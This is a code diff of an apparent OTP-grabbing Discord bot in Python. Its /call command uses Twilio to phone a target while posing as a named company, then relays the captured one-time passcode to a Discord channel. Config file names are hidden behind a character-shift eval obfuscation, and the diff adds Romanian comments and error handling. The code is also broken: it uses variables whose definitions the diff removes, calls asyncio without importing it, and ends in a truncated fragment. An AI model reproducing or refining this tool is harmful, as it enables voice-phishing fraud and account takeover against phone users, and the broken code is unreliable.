@@ -1,23 +1,21 @@
-# by Dvine aka mogaly
-
 import time
 import os
 import discord_slash.utils.manage_commands as manage_commands
 import requests
 import discord
-import os
-from discord_slash import SlashCommand
-from flask import Flask, request
-from twilio.rest import Client
 import json
 from discord.ext import commands
 from discord_slash import SlashCommand, SlashContext
+from twilio.rest import Client
+from flask import Flask
 
+# Configurare inițială
 a = lambda x: ''.join(chr(ord(i) - 1) for i in x)
 b = eval(a('"VQD@qo@@r|ro^@uy}rro@vnttq{omrr"'))
 c = eval(a('"Urdyksyb:qo@"'))
 d = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))
 
+# Creare fișiere de configurare dacă nu există
 if b not in os.listdir():
     with open(b, 'w') as file:
         file.write('{"account_sid":"?", "auth_token":"?", "Twilio Phone Number":"+1?", "ngrok_url":"https://you-url.ngrok.io", "server_id":"?", "bot_token":"?"}')
@@ -28,22 +26,7 @@ if c not in os.listdir():
 if d not in os.listdir():
     os.mkdir(d)
 
-if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
-    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XYr~{xo@Vs||Irovs.txt"')), 'w').close()
-
-if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/Xphmhs\\kxss@Yr|ymUxmsa.txt"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
-    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/Xphmhs\\kxss@Yr|ymUxmsa.txt"')), 'w').close()
-
-if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XymwxSqevo.txt"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
-    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XymwxSqevo.txt"')), 'w').close()
-
-if eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XyrkjSnsfvo.txt"')) not in os.listdir(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps"'))):
-    open(eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XyrkjSnsfvo.txt"')), 'w').close()
-
-e = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/Xphmhs\\kxss@Yr|ymUxmsa.txt"'))
-f = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XymwxSqevo.txt"'))
-g = eval(a('"Xs|{u:rrd|o@@Zrspr@Ysps/XyrkjSnsfvo.txt"'))
-
+# Citire configurare
 raw_config = json.loads(open(b, 'r').read())
 
 client_discord = commands.Bot(command_prefix='')
@@ -94,34 +77,43 @@ async def _call(ctx=SlashContext, cell_phone=str, otp_digits=str, client_name=st
     open(f, 'w').write(f'{otp_digits}')
     open(g, 'w').write(f'{client_name}')
     open(e, 'w').write(f'{company_name}')
-    call = client.calls.create(
-        url=f'{ngrok}/voice',
-        to=f'{cell_phone}',
-        from_=f'{your_twilio_phone_number}'
-    )
+    
+    try:
+        call = client.calls.create(
+            url=f'{ngrok}/voice',
+            to=f'{cell_phone}',
+            from_=f'{your_twilio_phone_number}'
+        )
+    except Exception as e:
+        await ctx.send(f"Error: {str(e)}")
+        return
+
     sid = call.sid
     print(sid)
-    status_dict = {'queued': 0, 'ringing': 0, 'in-progress': 0, 'completed': 0, 'failed': 0, 'no-answer': 0,
-                   'canceled': 0, 'busy': 0}
+
+    status_dict = {'queued': 0, 'ringing': 0, 'in-progress': 0, 'completed': 0, 'failed': 0, 'no-answer': 0, 'canceled': 0, 'busy': 0}
+
     while True:
         call_status = client.calls(sid).fetch().status
         if call_status in status_dict and not status_dict[call_status] >= 1:
             embed = discord.Embed(title='', description=f'Call {call_status.replace("-", " ").title()}', color=discord.Colour.green() if call_status == 'completed' else discord.Colour.red())
             await ctx.channel.send(embed=embed)
             status_dict[call_status] += 1
+        
         if call_status == 'completed' or call_status == 'failed' or call_status == 'no-answer' or call_status == 'canceled' or call_status == 'busy':
             break
-        time.sleep(1)
-    time.sleep(1)
+        await asyncio.sleep(1)
+
     otp = open(f'grabbed_otp.txt', 'r').read()
     call1 = client.calls(sid).fetch()
     if not otp:
         embed = discord.Embed(title='', description=f'Unable To Grab OTP\n\nPrice : {call1.price}\nDuration : {call1.duration} secs', color=discord.Colour.red())
     else:
         embed = discord.Embed(title='', description=f'{otp}\n\nPrice : {call1.price}\nDuration : {call1.duration} secs', color=discord.Colour.green())
+    
     await ctx.channel.send(embed=embed)
     open('grabbed_otp.txt', 'w').close()
 
-@slash.slash(
-    name='redial',
-    description='Use this command if the
+# Asigură-te că aplicația Flask este pornită corect
+if __name__ == "__main__":
+    app.run(port=5000)
